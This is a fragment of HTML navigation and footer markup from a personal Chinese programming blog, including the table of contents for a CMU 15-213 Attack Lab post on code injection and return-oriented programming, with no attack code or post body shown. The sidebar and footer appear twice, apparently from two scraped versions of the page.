href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="bookmark" title="15213 Lab 2-Bomb lab 实验记录">15213 Lab 2-Bomb lab 实验记录</a></li><li  class="active"><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="bookmark" title="15213 Lab 3-Attack lab 实验记录">15213 Lab 3-Attack lab 实验记录</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Salvely" data-src="/blog/assets/avatar.jpg"/><p class="name" itemprop="name">Salvely</p><div class="description" itemprop="description">计算机&数理&文学爱好者，喜欢健身、下厨、听音乐和看电影</div></div><nav class="state"><div class="item posts"><a href="/blog/archives/"><span class="count">17</span><span class="name">文章</span></a></div><div class="item categories"><a href="/blog/categories/"><span class="count">15</span><span class="name">分类</span></a></div><div class="item tags"><a href="/blog/tags/"><span class="count">12</span><span class="name">标签</span></a></div></nav><div class="social"><a href="https://github.com/Salvely" class="item github" rel="noopener" title="https:&#x2F;&#x2F;github.com&#x2F;Salvely" target="_blank"><i class="ic i-github"></i></a><a href="/blog/iamgwen9@gmail.com" class="item email" title="iamgwen9@gmail.com"><i class="ic i-envelope"></i></a></div><div class="menu"><li class="item"><a href="/blog/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/blog/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/blog/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/blog/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/blog/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/blog/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/blog/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-home"></i>学习</a><ul class="submenu"><li class="item"><a href="/blog/roadmap/" rel="section"><i class="ic i-check"></i>学习路径</a></li><li class="item"><a href="/blog/course/" rel="section"><i class="ic i-check"></i>CourseDone</a></li><li class="item"><a href="https://github.com/Salvely/Weekly-report" rel="noopener" target="_blank"><i class="ic i-pen"></i>学习周报</a></li></ul></li><li class="item"><a href="/blog/hobby" rel="section"><i class="ic i-coffee"></i>爱好</a></li><li class="item"><a href="/blog/go/" rel="section"><i class="ic i-link"></i>开往</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="分类于CSAPP 阅读笔记">CSAPP 阅读笔记</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/">CSAPP Chapter 1 - 计算机系统漫游</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/Projects/" title="分类于Projects">Projects</a><i class="ic i-angle-right"></i><a href="/blog/categories/Projects/Snake/" title="分类于Snake">Snake</a></div><span><a href="/blog/2023/10/31/Projects/Snake/analysis/">动手写贪吃蛇游戏</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" title="分类于编程语言">编程语言</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/" title="分类于C++">C++</a></div><span><a href="/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/">C++参考资料</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="分类于CSAPP 阅读笔记">CSAPP 阅读笔记</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch3/">CSAPP Chapter 3 - 程序的机器级表示</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" title="分类于开发工具">开发工具</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Debian/" title="分类于Debian">Debian</a></div><span><a href="/blog/2023/10/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Debian/Debain%E5%8C%85%E7%AE%A1%E7%90%86/">Debian包管理初探</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/" title="分类于CIT5950">CIT5950</a></div><span><a href="/blog/2024/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW3/">HW3: LRU SimpleVM 实现记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/" title="分类于CIT5950">CIT5950</a></div><span><a href="/blog/2024/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW4/">HW4: Shell & Pipe 实现记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Lab/" title="分类于15-213 Lab">15-213 Lab</a></div><span><a href="/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/">15213 Lab 1-data lab 实验记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" title="分类于开发工具">开发工具</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/" title="分类于Arch">Arch</a></div><span><a href="/blog/2023/10/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/">Arch Linux系统配置教程</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Lab/" title="分类于15-213 Lab">15-213 Lab</a></div><span><a href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/">15213 Lab 2-Bomb lab 实验记录</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"><li class="item" v-for="com in coms"><a v-bind:href="root + com.href" data-pjax-state="data-pjax-state"><span class="breadcrumb">{{com.nick}} @ {{com.time}}</span><span>{{com.text}}<br/></span></a></li></ul></div></div><div class="status"><div class="copyright">&copy; 2023 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">Salvely @ Salvely</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">186k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">2:49</span></div><div class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+}, 1000)</script></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-I-Code-Injection-Attack"><span class="toc-number">2.</span> <span class="toc-text">Part I: Code Injection Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-1%EF%BC%9A%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">Phase 1：覆盖返回地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-2%EF%BC%9A%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text">Phase 2：在 buf 中插入攻击代码并覆盖返回地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-3%EF%BC%9A%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%89%80%E9%9C%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.3.</span> <span class="toc-text">Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E7%9A%84%E9%94%99%E8%AF%AF%E8%A7%A3%E7%AD%94"><span class="toc-number">2.3.1.</span> <span class="toc-text">一开始的错误解答</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%BD%E7%95%A5%E9%9A%8F%E6%9C%BA%E6%A0%88%E7%A9%BA%E9%97%B4%E7%9A%84%E4%B8%8D%E6%AD%A3%E7%A1%AE%E8%A7%A3%E7%AD%94"><span class="toc-number">2.3.2.</span> <span class="toc-text">忽略随机栈空间的不正确解答</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%A7%A3%E7%AD%94"><span class="toc-number">2.3.3.</span> <span class="toc-text">正确的解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-II-Return-oriented-Programming-attack"><span class="toc-number">3.</span> <span class="toc-text">Part II: Return oriented Programming attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-4"><span class="toc-number">3.1.</span> <span class="toc-text">Phase 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-5"><span class="toc-number">3.2.</span> <span class="toc-text">Phase 5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="bookmark" title="15213 Lab 1-data lab 实验记录">15213 Lab 1-data lab 实验记录</a></li><li ><a href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="bookmark" title="15213 Lab 2-Bomb lab 实验记录">15213 Lab 2-Bomb lab 实验记录</a></li><li  class="active"><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="bookmark" title="15213 Lab 3-Attack lab 实验记录">15213 Lab 3-Attack lab 实验记录</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Salvely" data-src="/blog/assets/avatar.jpg"/><p class="name" itemprop="name">Salvely</p><div class="description" itemprop="description">计算机&数理&文学爱好者，喜欢健身、下厨、听音乐和看电影</div></div><nav class="state"><div class="item posts"><a href="/blog/archives/"><span class="count">24</span><span class="name">文章</span></a></div><div class="item categories"><a href="/blog/categories/"><span class="count">16</span><span class="name">分类</span></a></div><div class="item tags"><a href="/blog/tags/"><span class="count">12</span><span class="name">标签</span></a></div></nav><div class="social"><a href="https://github.com/Salvely" class="item github" rel="noopener" title="https:&#x2F;&#x2F;github.com&#x2F;Salvely" target="_blank"><i class="ic i-github"></i></a><a href="/blog/iamgwen9@gmail.com" class="item email" title="iamgwen9@gmail.com"><i class="ic i-envelope"></i></a></div><div class="menu"><li class="item"><a href="/blog/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/blog/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/blog/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/blog/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/blog/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/blog/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/blog/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-home"></i>学习</a><ul class="submenu"><li class="item"><a href="/blog/roadmap/" rel="section"><i class="ic i-check"></i>学习路径</a></li><li class="item"><a href="/blog/course/" rel="section"><i class="ic i-check"></i>CourseDone</a></li><li class="item"><a href="https://github.com/Salvely/Weekly-report" rel="noopener" target="_blank"><i class="ic i-pen"></i>学习周报</a></li></ul></li><li class="item"><a href="/blog/hobby" rel="section"><i class="ic i-coffee"></i>爱好</a></li><li class="item"><a href="/blog/go/" rel="section"><i class="ic i-link"></i>开往</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" title="分类于开发工具">开发工具</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/" title="分类于Arch">Arch</a></div><span><a href="/blog/2023/10/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/">Arch Linux系统配置教程</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Lab/" title="分类于15-213 Lab">15-213 Lab</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/">15213 Lab 3-Attack lab 实验记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" 